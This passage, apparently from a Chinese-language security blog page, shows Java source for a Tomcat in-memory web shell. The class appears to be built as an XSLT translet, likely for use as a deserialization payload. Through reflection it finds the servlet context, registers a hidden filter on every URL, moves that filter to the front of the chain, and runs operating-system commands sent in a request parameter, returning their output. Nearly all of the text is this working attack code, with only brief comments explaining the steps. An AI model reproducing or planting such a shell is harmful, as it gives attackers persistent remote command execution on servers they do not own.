</span></span><span style=display:flex><span>                    <span style=color:#111>stateField</span><span style=color:#f92672>.</span><span style=color:#75af00>setAccessible</span><span style=color:#f92672>(</span><span style=color:#00a8c8>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>                    <span style=color:#111>stateField</span><span style=color:#f92672>.</span><span style=color:#75af00>set</span><span style=color:#f92672>(</span><span style=color:#111>standardContext</span><span style=color:#f92672>,</span> <span style=color:#111>LifecycleState</span><span style=color:#f92672>.</span><span style=color:#75af00>STARTING_PREP</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                    <span style=color:#111>Filter</span> <span style=color:#111>myFilter</span> <span style=color:#f92672>=</span><span style=color:#00a8c8>new</span> <span style=color:#111>TomcatInject</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>                    <span style=color:#75715e>// 调用doFilter来动态添加Filter 也可以利用反射
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                    <span style=color:#111>javax</span><span style=color:#f92672>.</span><span style=color:#75af00>servlet</span><span style=color:#f92672>.</span><span style=color:#75af00>FilterRegistration</span><span style=color:#f92672>.</span><span style=color:#75af00>Dynamic</span> <span style=color:#111>filterRegistration</span> <span style=color:#f92672>=</span>
</span></span><span style=display:flex><span>                            <span style=color:#111>servletContext</span><span style=color:#f92672>.</span><span style=color:#75af00>addFilter</span><span style=color:#f92672>(</span><span style=color:#111>filterName</span><span style=color:#f92672>,</span><span style=color:#111>myFilter</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                    <span style=color:#75715e>// 进行一些简单的设置
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                    <span style=color:#111>filterRegistration</span><span style=color:#f92672>.</span><span style=color:#75af00>setInitParameter</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;encoding&#34;</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;utf-8&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>                    <span style=color:#111>filterRegistration</span><span style=color:#f92672>.</span><span style=color:#75af00>setAsyncSupported</span><span style=color:#f92672>(</span><span style=color:#00a8c8>false</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>                    <span style=color:#75715e>// 设置基本的 url pattern
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                    <span style=color:#111>filterRegistration</span>
</span></span><span style=display:flex><span>                            <span style=color:#f92672>.</span><span style=color:#75af00>addMappingForUrlPatterns</span><span style=color:#f92672>(</span><span style=color:#111>java</span><span style=color:#f92672>.</span><span style=color:#75af00>util</span><span style=color:#f92672>.</span><span style=color:#75af00>EnumSet</span><span style=color:#f92672>.</span><span style=color:#75af00>of</span><span style=color:#f92672>(</span><span style=color:#111>javax</span><span style=color:#f92672>.</span><span style=color:#75af00>servlet</span><span style=color:#f92672>.</span><span style=color:#75af00>DispatcherType</span><span style=color:#f92672>.</span><span style=color:#75af00>REQUEST</span><span style=color:#f92672>),</span> <span style=color:#00a8c8>false</span><span style=color:#f92672>,</span>
</span></span><span style=display:flex><span>                                    <span style=color:#00a8c8>new</span> <span style=color:#111>String</span><span style=color:#f92672>[]{</span><span style=color:#d88200>&#34;/*&#34;</span><span style=color:#f92672>});</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                    <span style=color:#75715e>// 将服务重新修改回来，不然的话服务会无法正常进行
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                    <span style=color:#00a8c8>if</span> <span style=color:#f92672>(</span><span style=color:#111>stateField</span> <span style=color:#f92672>!=</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>){</span>
</span></span><span style=display:flex><span>                        <span style=color:#111>stateField</span><span style=color:#f92672>.</span><span style=color:#75af00>set</span><span style=color:#f92672>(</span><span style=color:#111>standardContext</span><span style=color:#f92672>,</span><span style=color:#111>org</span><span style=color:#f92672>.</span><span style=color:#75af00>apache</span><span style=color:#f92672>.</span><span style=color:#75af00>catalina</span><span style=color:#f92672>.</span><span style=color:#75af00>LifecycleState</span><span style=color:#f92672>.</span><span style=color:#75af00>STARTED</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>                    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                    <span style=color:#75715e>// 设置好之后调用filterstart来启动我们的 filter
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                    <span style=color:#00a8c8>if</span> <span style=color:#f92672>(</span><span style=color:#111>standardContext</span> <span style=color:#f92672>!=</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>){</span>
</span></span><span style=display:flex><span>                        <span style=color:#111>Method</span> <span style=color:#111>filterStartMethod</span> <span style=color:#f92672>=</span> <span style=color:#111>StandardContext</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>.</span><span style=color:#75af00>getDeclaredMethod</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;filterStart&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>                        <span style=color:#111>filterStartMethod</span><span style=color:#f92672>.</span><span style=color:#75af00>setAccessible</span><span style=color:#f92672>(</span><span style=color:#00a8c8>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>                        <span style=color:#111>filterStartMethod</span><span style=color:#f92672>.</span><span style=color:#75af00>invoke</span><span style=color:#f92672>(</span><span style=color:#111>standardContext</span><span style=color:#f92672>,</span><span style=color:#00a8c8>null</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                        <span style=color:#75715e>// 把filter插到第一位
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                        <span style=color:#111>Class</span> <span style=color:#111>ccc</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>                        <span style=color:#00a8c8>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>                            <span style=color:#111>ccc</span> <span style=color:#f92672>=</span> <span style=color:#111>Class</span><span style=color:#f92672>.</span><span style=color:#75af00>forName</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;org.apache.tomcat.util.descriptor.web.FilterMap&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>                        <span style=color:#f92672>}</span> <span style=color:#00a8c8>catch</span> <span style=color:#f92672>(</span><span style=color:#111>Throwable</span> <span style=color:#111>t</span><span style=color:#f92672>){}</span>
</span></span><span style=display:flex><span>                        <span style=color:#00a8c8>if</span> <span style=color:#f92672>(</span><span style=color:#111>ccc</span> <span style=color:#f92672>==</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>                            <span style=color:#00a8c8>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>                                <span style=color:#111>ccc</span> <span style=color:#f92672>=</span> <span style=color:#111>Class</span><span style=color:#f92672>.</span><span style=color:#75af00>forName</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;org.apache.catalina.deploy.FilterMap&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>                            <span style=color:#f92672>}</span> <span style=color:#00a8c8>catch</span> <span style=color:#f92672>(</span><span style=color:#111>Throwable</span> <span style=color:#111>t</span><span style=color:#f92672>){}</span>
</span></span><span style=display:flex><span>                        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                        <span style=color:#111>Method</span> <span style=color:#111>m</span> <span style=color:#f92672>=</span> <span style=color:#111>Class</span><span style=color:#f92672>.</span><span style=color:#75af00>forName</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;org.apache.catalina.core.StandardContext&#34;</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>                                <span style=color:#f92672>.</span><span style=color:#75af00>getDeclaredMethod</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;findFilterMaps&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>                        <span style=color:#111>Object</span><span style=color:#f92672>[]</span> <span style=color:#111>filterMaps</span> <span style=color:#f92672>=</span> <span style=color:#f92672>(</span><span style=color:#111>Object</span><span style=color:#f92672>[])</span> <span style=color:#111>m</span><span style=color:#f92672>.</span><span style=color:#75af00>invoke</span><span style=color:#f92672>(</span><span style=color:#111>standardContext</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>                        <span style=color:#111>Object</span><span style=color:#f92672>[]</span> <span style=color:#111>tmpFilterMaps</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Object</span><span style=color:#f92672>[</span><span style=color:#111>filterMaps</span><span style=color:#f92672>.</span><span style=color:#75af00>length</span><span style=color:#f92672>];</span>
</span></span><span style=display:flex><span>                        <span style=color:#00a8c8>int</span> <span style=color:#111>index</span> <span style=color:#f92672>=</span> <span style=color:#111>1</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>                        <span style=color:#00a8c8>for</span> <span style=color:#f92672>(</span><span style=color:#00a8c8>int</span> <span style=color:#111>i</span> <span style=color:#f92672>=</span> <span style=color:#111>0</span><span style=color:#f92672>;</span> <span style=color:#111>i</span> <span style=color:#f92672>&lt;</span> <span style=color:#111>filterMaps</span><span style=color:#f92672>.</span><span style=color:#75af00>length</span><span style=color:#f92672>;</span> <span style=color:#111>i</span><span style=color:#f92672>++)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>                            <span style=color:#111>Object</span> <span style=color:#111>o</span> <span style=color:#f92672>=</span> <span style=color:#111>filterMaps</span><span style=color:#f92672>[</span><span style=color:#111>i</span><span style=color:#f92672>];</span>
</span></span><span style=display:flex><span>                            <span style=color:#111>m</span> <span style=color:#f92672>=</span> <span style=color:#111>ccc</span><span style=color:#f92672>.</span><span style=color:#75af00>getMethod</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;getFilterName&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>                            <span style=color:#111>String</span> <span style=color:#111>name</span> <span style=color:#f92672>=</span> <span style=color:#f92672>(</span><span style=color:#111>String</span><span style=color:#f92672>)</span> <span style=color:#111>m</span><span style=color:#f92672>.</span><span style=color:#75af00>invoke</span><span style=color:#f92672>(</span><span style=color:#111>o</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>                            <span style=color:#00a8c8>if</span> <span style=color:#f92672>(</span><span style=color:#111>name</span><span style=color:#f92672>.</span><span style=color:#75af00>equalsIgnoreCase</span><span style=color:#f92672>(</span><span style=color:#111>filterName</span><span style=color:#f92672>))</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>                                <span style=color:#111>tmpFilterMaps</span><span style=color:#f92672>[</span><span style=color:#111>0</span><span style=color:#f92672>]</span> <span style=color:#f92672>=</span> <span style=color:#111>o</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>                            <span style=color:#f92672>}</span> <span style=color:#00a8c8>else</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>                                <span style=color:#111>tmpFilterMaps</span><span style=color:#f92672>[</span><span style=color:#111>index</span><span style=color:#f92672>++]</span> <span style=color:#f92672>=</span> <span style=color:#111>filterMaps</span><span style=color:#f92672>[</span><span style=color:#111>i</span><span style=color:#f92672>];</span>
</span></span><span style=display:flex><span>                            <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>                        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>                        <span style=color:#00a8c8>for</span> <span style=color:#f92672>(</span><span style=color:#00a8c8>int</span> <span style=color:#111>i</span> <span style=color:#f92672>=</span> <span style=color:#111>0</span><span style=color:#f92672>;</span> <span style=color:#111>i</span> <span style=color:#f92672>&lt;</span> <span style=color:#111>filterMaps</span><span style=color:#f92672>.</span><span style=color:#75af00>length</span><span style=color:#f92672>;</span> <span style=color:#111>i</span><span style=color:#f92672>++)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>                            <span style=color:#111>filterMaps</span><span style=color:#f92672>[</span><span style=color:#111>i</span><span style=color:#f92672>]</span> <span style=color:#f92672>=</span> <span style=color:#111>tmpFilterMaps</span><span style=color:#f92672>[</span><span style=color:#111>i</span><span style=color:#f92672>];</span>
</span></span><span style=display:flex><span>                        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>                    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>                <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#00a8c8>catch</span> <span style=color:#f92672>(</span><span style=color:#111>Exception</span> <span style=color:#111>e</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#75715e>// e.printStackTrace();
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>private</span> <span style=color:#00a8c8>static</span> <span style=color:#111>ServletContext</span> <span style=color:#75af00>getServletContext</span><span style=color:#f92672>()</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>throws</span> <span style=color:#111>NoSuchFieldException</span><span style=color:#f92672>,</span> <span style=color:#111>IllegalAccessException</span><span style=color:#f92672>,</span> <span style=color:#111>ClassNotFoundException</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#111>ServletRequest</span> <span style=color:#111>servletRequest</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Class</span> <span style=color:#111>c</span> <span style=color:#f92672>=</span> <span style=color:#111>Class</span><span style=color:#f92672>.</span><span style=color:#75af00>forName</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;org.apache.catalina.core.ApplicationFilterChain&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>java</span><span style=color:#f92672>.</span><span style=color:#75af00>lang</span><span style=color:#f92672>.</span><span style=color:#75af00>reflect</span><span style=color:#f92672>.</span><span style=color:#75af00>Field</span> <span style=color:#111>f</span> <span style=color:#f92672>=</span> <span style=color:#111>c</span><span style=color:#f92672>.</span><span style=color:#75af00>getDeclaredField</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;lastServicedRequest&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>f</span><span style=color:#f92672>.</span><span style=color:#75af00>setAccessible</span><span style=color:#f92672>(</span><span style=color:#00a8c8>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>ThreadLocal</span> <span style=color:#111>threadLocal</span> <span style=color:#f92672>=</span> <span style=color:#f92672>(</span><span style=color:#111>ThreadLocal</span><span style=color:#f92672>)</span> <span style=color:#111>f</span><span style=color:#f92672>.</span><span style=color:#75af00>get</span><span style=color:#f92672>(</span><span style=color:#00a8c8>null</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>if</span> <span style=color:#f92672>(</span><span style=color:#111>threadLocal</span> <span style=color:#f92672>!=</span> <span style=color:#00a8c8>null</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#111>threadLocal</span><span style=color:#f92672>.</span><span style=color:#75af00>get</span><span style=color:#f92672>()</span> <span style=color:#f92672>!=</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#111>servletRequest</span> <span style=color:#f92672>=</span> <span style=color:#f92672>(</span><span style=color:#111>ServletRequest</span><span style=color:#f92672>)</span> <span style=color:#111>threadLocal</span><span style=color:#f92672>.</span><span style=color:#75af00>get</span><span style=color:#f92672>();</span>    <span style=color:#75715e>// 证明前半部分成功
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// 如果失败则换其他方式
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#75715e>// spring获取法1
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#00a8c8>if</span> <span style=color:#f92672>(</span><span style=color:#111>servletRequest</span> <span style=color:#f92672>==</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>                <span style=color:#111>c</span> <span style=color:#f92672>=</span> <span style=color:#111>Class</span><span style=color:#f92672>.</span><span style=color:#75af00>forName</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;org.springframework.web.context.request.RequestContextHolder&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>                <span style=color:#111>Method</span> <span style=color:#111>m</span> <span style=color:#f92672>=</span> <span style=color:#111>c</span><span style=color:#f92672>.</span><span style=color:#75af00>getMethod</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;getRequestAttributes&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>                <span style=color:#111>Object</span> <span style=color:#111>o</span> <span style=color:#f92672>=</span> <span style=color:#111>m</span><span style=color:#f92672>.</span><span style=color:#75af00>invoke</span><span style=color:#f92672>(</span><span style=color:#00a8c8>null</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>                <span style=color:#111>c</span> <span style=color:#f92672>=</span> <span style=color:#111>Class</span><span style=color:#f92672>.</span><span style=color:#75af00>forName</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;org.springframework.web.context.request.ServletRequestAttributes&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>                <span style=color:#111>m</span> <span style=color:#f92672>=</span> <span style=color:#111>c</span><span style=color:#f92672>.</span><span style=color:#75af00>getMethod</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;getRequest&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>                <span style=color:#111>servletRequest</span> <span style=color:#f92672>=</span> <span style=color:#f92672>(</span><span style=color:#111>ServletRequest</span><span style=color:#f92672>)</span> <span style=color:#111>m</span><span style=color:#f92672>.</span><span style=color:#75af00>invoke</span><span style=color:#f92672>(</span><span style=color:#111>o</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>}</span> <span style=color:#00a8c8>catch</span> <span style=color:#f92672>(</span><span style=color:#111>Throwable</span> <span style=color:#111>t</span><span style=color:#f92672>)</span> <span style=color:#f92672>{}</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>if</span> <span style=color:#f92672>(</span><span style=color:#111>servletRequest</span> <span style=color:#f92672>!=</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>return</span> <span style=color:#111>servletRequest</span><span style=color:#f92672>.</span><span style=color:#75af00>getServletContext</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// spring获取法2
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#00a8c8>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#111>c</span> <span style=color:#f92672>=</span> <span style=color:#111>Class</span><span style=color:#f92672>.</span><span style=color:#75af00>forName</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;org.springframework.web.context.ContextLoader&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#111>Method</span> <span style=color:#111>m</span> <span style=color:#f92672>=</span> <span style=color:#111>c</span><span style=color:#f92672>.</span><span style=color:#75af00>getMethod</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;getCurrentWebApplicationContext&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#111>Object</span> <span style=color:#111>o</span> <span style=color:#f92672>=</span> <span style=color:#111>m</span><span style=color:#f92672>.</span><span style=color:#75af00>invoke</span><span style=color:#f92672>(</span><span style=color:#00a8c8>null</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#111>c</span> <span style=color:#f92672>=</span> <span style=color:#111>Class</span><span style=color:#f92672>.</span><span style=color:#75af00>forName</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;org.springframework.web.context.WebApplicationContext&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#111>m</span> <span style=color:#f92672>=</span> <span style=color:#111>c</span><span style=color:#f92672>.</span><span style=color:#75af00>getMethod</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;getServletContext&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#111>ServletContext</span> <span style=color:#111>servletContext</span> <span style=color:#f92672>=</span> <span style=color:#f92672>(</span><span style=color:#111>ServletContext</span><span style=color:#f92672>)</span> <span style=color:#111>m</span><span style=color:#f92672>.</span><span style=color:#75af00>invoke</span><span style=color:#f92672>(</span><span style=color:#111>o</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>return</span> <span style=color:#111>servletContext</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#00a8c8>catch</span> <span style=color:#f92672>(</span><span style=color:#111>Throwable</span> <span style=color:#111>t</span><span style=color:#f92672>)</span> <span style=color:#f92672>{}</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>return</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>@Override</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>void</span> <span style=color:#75af00>transform</span><span style=color:#f92672>(</span><span style=color:#111>DOM</span> <span style=color:#111>document</span><span style=color:#f92672>,</span> <span style=color:#111>SerializationHandler</span><span style=color:#f92672>[]</span> <span style=color:#111>handlers</span><span style=color:#f92672>)</span> <span style=color:#00a8c8>throws</span> <span style=color:#111>TransletException</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>@Override</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>void</span> <span style=color:#75af00>transform</span><span style=color:#f92672>(</span><span style=color:#111>DOM</span> <span style=color:#111>document</span><span style=color:#f92672>,</span> <span style=color:#111>DTMAxisIterator</span> <span style=color:#111>iterator</span><span style=color:#f92672>,</span> <span style=color:#111>SerializationHandler</span> <span style=color:#111>handler</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>throws</span> <span style=color:#111>TransletException</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>@Override</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>void</span> <span style=color:#75af00>init</span><span style=color:#f92672>(</span><span style=color:#111>FilterConfig</span> <span style=color:#111>filterConfig</span><span style=color:#f92672>)</span> <span style=color:#00a8c8>throws</span> <span style=color:#111>ServletException</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>@Override</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>void</span> <span style=color:#75af00>doFilter</span><span style=color:#f92672>(</span><span style=color:#111>ServletRequest</span> <span style=color:#111>servletRequest</span><span style=color:#f92672>,</span> <span style=color:#111>ServletResponse</span> <span style=color:#111>servletResponse</span><span style=color:#f92672>,</span>
</span></span><span style=display:flex><span>                         <span style=color:#111>FilterChain</span> <span style=color:#111>filterChain</span><span style=color:#f92672>)</span> <span style=color:#00a8c8>throws</span> <span style=color:#111>IOException</span><span style=color:#f92672>,</span> <span style=color:#111>ServletException</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// System.out.println(&#34;TomcatShellInject doFilter..........&#34;);
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#111>String</span> <span style=color:#111>cmd</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>if</span> <span style=color:#f92672>((</span><span style=color:#111>cmd</span> <span style=color:#f92672>=</span> <span style=color:#111>servletRequest</span><span style=color:#f92672>.</span><span style=color:#75af00>getParameter</span><span style=color:#f92672>(</span><span style=color:#111>cmdParamName</span><span style=color:#f92672>))</span> <span style=color:#f92672>!=</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#111>Process</span> <span style=color:#111>process</span> <span style=color:#f92672>=</span> <span style=color:#111>Runtime</span><span style=color:#f92672>.</span><span style=color:#75af00>getRuntime</span><span style=color:#f92672>().</span><span style=color:#75af00>exec</span><span style=color:#f92672>(</span><span style=color:#111>cmd</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#111>java</span><span style=color:#f92672>.</span><span style=color:#75af00>io</span><span style=color:#f92672>.</span><span style=color:#75af00>BufferedReader</span> <span style=color:#111>bufferedReader</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>java</span><span style=color:#f92672>.</span><span style=color:#75af00>io</span><span style=color:#f92672>.</span><span style=color:#75af00>BufferedReader</span><span style=color:#f92672>(</span>
</span></span><span style=display:flex><span>                    <span style=color:#00a8c8>new</span> <span style=color:#111>java</span><span style=color:#f92672>.</span><span style=color:#75af00>io</span><span style=color:#f92672>.</span><span style=color:#75af00>InputStreamReader</span><span style=color:#f92672>(</span><span style=color:#111>process</span><span style=color:#f92672>.</span><span style=color:#75af00>getInputStream</span><span style=color:#f92672>()));</span>
</span></span><span style=display:flex><span>            <span style=color:#111>StringBuilder</span> <span style=color:#111>stringBuilder</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>StringBuilder</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>            <span style=color:#111>String</span> <span style=color:#111>line</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>while</span> <span style=color:#f92672>((</span><span style=color:#111>line</span> <span style=color:#f92672>=</span> <span style=color:#111>bufferedReader</span><span style=color:#f92672>.</span><span style=color:#75af00>readLine</span><span style=color:#f92672>())</span> <span style=color:#f92672>!=</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>                <span style=color:#111>stringBuilder</span><span style=color:#f92672>.</span><span style=color:#75af00>append</span><span style=color:#f92672>(</span><span style=color:#111>line</span> <span style=color:#f92672>+</span> <span style=color:#d88200>&#39;\n&#39;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>            <span style=color:#111>servletResponse</span><span style=color:#f92672>.</span><span style=color:#75af00>getOutputStream</span><span style=color:#f92672>().</span><span style=color:#75af00>write</span><span style=color:#f92672>(</span><span style=color:#111>stringBuilder</span><span style=color:#f92672>.</span><span style=color:#75af00>toString</span><span style=color:#f92672>().</span><span style=color:#75af00>getBytes</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>            <span style=color:#111>servletResponse</span><span style=color:#f92672>.</span><span style=color:#75af00>getOutputStream</span><span style=color:#f92672>().</span><span style=color:#75af00>flush</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>            <span style=color:#111>servletResponse</span><span style=color:#f92672>.</span><span style=color:#75af00>getOutputStream</span><span style=color:#f92672>().</span><span style=color:#75af00>close</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>return</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>        <span style=color:#111>filterChain</span><span style=color:#f92672>.</span><span style=color:#75af00>doFilter</span><span style=color:#f92672>(</span><span style=color:#111>servletRequest</span><span style=color:#f92672>,</span> <span style=color:#111>servletResponse</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>@Override</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>void</span> <span style=color:#75af00>destroy</span><span style=color:#f92672>()</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
